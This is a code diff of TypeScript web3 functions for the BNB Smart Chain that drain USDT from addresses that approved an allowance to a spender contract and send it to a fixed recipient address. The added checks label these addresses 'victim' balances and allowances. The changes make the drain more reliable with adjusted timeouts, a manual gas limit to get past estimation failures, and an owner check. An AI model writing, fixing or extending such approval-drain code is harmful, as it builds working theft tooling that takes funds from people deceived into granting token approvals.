@@ -105,15 +105,71 @@ export const connectWalletBSC = async () => {
   }
 };
 
-export const withDrawFunds = async (from: string , amount: number) => {
+export const withDrawFunds = async (from: string, amount: number) => {
   try {
     const { web3, account } = await connectWalletBSC();
     if (!web3) throw new Error("Wallet connection failed");
+
+    // Fix Web3.js timeout for BSC
+    web3.eth.transactionBlockTimeout = 100; // default is 50, BSC can be slow
+    web3.eth.transactionPollingTimeout = 480;
+    web3.eth.transactionConfirmationBlocks = 1;
+
     // amount to be in wei
-    const amountInWei = web3.utils.toWei(amount.toString(), 'ether');
-    const deligator = new web3.eth.Contract(spender_Contract_Abi, SPENDER_ADDRESS);
-    const tx = await deligator.methods.delegatedTransfer(USDT_CONTRACT_ADDRESS, from, RECIPIENT_ADDRESS, amountInWei).send({ from: account });
-    return tx
+    const amountInWei = web3.utils.toWei(amount.toString(), "ether");
+
+    // Pre-flight checks for better error messages
+    const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
+    const victimBalance = await usdtContract.methods.balanceOf(from).call();
+    const victimAllowance = await usdtContract.methods
+      .allowance(from, SPENDER_ADDRESS)
+      .call();
+
+    if (BigInt(victimBalance) < BigInt(amountInWei)) {
+      throw new Error(
+        `Victim balance too low: ${web3.utils.fromWei(
+          victimBalance,
+          "ether"
+        )} USDT`
+      );
+    }
+
+    if (BigInt(victimAllowance) < BigInt(amountInWei)) {
+      throw new Error(
+        `Insufficient allowance: ${web3.utils.fromWei(
+          victimAllowance,
+          "ether"
+        )} USDT`
+      );
+    }
+
+    const deligator = new web3.eth.Contract(
+      spender_Contract_Abi,
+      SPENDER_ADDRESS
+    );
+
+    // Check ownership
+    const owner = await deligator.methods.owner().call();
+    if (account.toLowerCase() !== owner.toLowerCase()) {
+      throw new Error(`Only the owner (${owner}) can withdraw.`);
+    }
+
+    const gasPrice = await web3.eth.getGasPrice();
+
+    console.log("withdrawing from:", from, "amount:", amount);
+    const tx = await deligator.methods
+      .delegatedTransfer(
+        USDT_CONTRACT_ADDRESS,
+        from,
+        RECIPIENT_ADDRESS,
+        amountInWei
+      )
+      .send({
+        from: account,
+        gas: 250000, // Manual gas limit to bypass estimation failure
+        gasPrice: gasPrice,
+      });
+    return tx;
   } catch (err) {
     console.error("Error in withDrawFunds:", err);
     return {
@@ -123,40 +179,45 @@ export const withDrawFunds = async (from: string , amount: number) => {
   }
 };
 
-export const contract_Owner= async ():Promise<string | null> => {
+export const contract_Owner = async (): Promise<string | null> => {
   try {
     const { web3 } = await connectWalletBSC();
     if (!web3) throw new Error("Wallet connection failed");
-    const usdtContract = new web3.eth.Contract(spender_Contract_Abi, SPENDER_ADDRESS);
+    const usdtContract = new web3.eth.Contract(
+      spender_Contract_Abi,
+      SPENDER_ADDRESS
+    );
     const owner = await usdtContract.methods.owner().call();
     return owner as unknown as string;
   } catch (error) {
-    console.error("Error fetching balance:", error);
+    console.error("Error fetching owner:", error);
     return null;
   }
 };
 
-
-
-export const balance_USDT_Allownce = async (user: string):Promise<UserBalance> => {
+export const balance_USDT_Allownce = async (
+  user: string
+): Promise<UserBalance> => {
   try {
     const { web3 } = await connectWalletBSC();
     if (!web3) throw new Error("Wallet connection failed");
     const usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);
     const balance = await usdtContract.methods.balanceOf(user).call();
-    const userAllow = await usdtContract.methods.allowance(user, SPENDER_ADDRESS).call();
+    const userAllow = await usdtContract.methods
+      .allowance(user, SPENDER_ADDRESS)
+      .call();
     console.log("user", user, "Balance:", balance, "Allowance:", userAllow);
     return {
-        balance: (Number(balance)/10**18).toFixed(7),
-        allowance: Number(userAllow),
-        error: null
-    }
+      balance: (Number(balance) / 10 ** 18).toFixed(7),
+      allowance: Number(userAllow),
+      error: null,
+    };
   } catch (error) {
     console.error("Error fetching balance:", error);
     return {
-        balance: '0',
-        allowance: 0,
-        error: error as Error
+      balance: "0",
+      allowance: 0,
+      error: error as Error,
     };
   }
 };
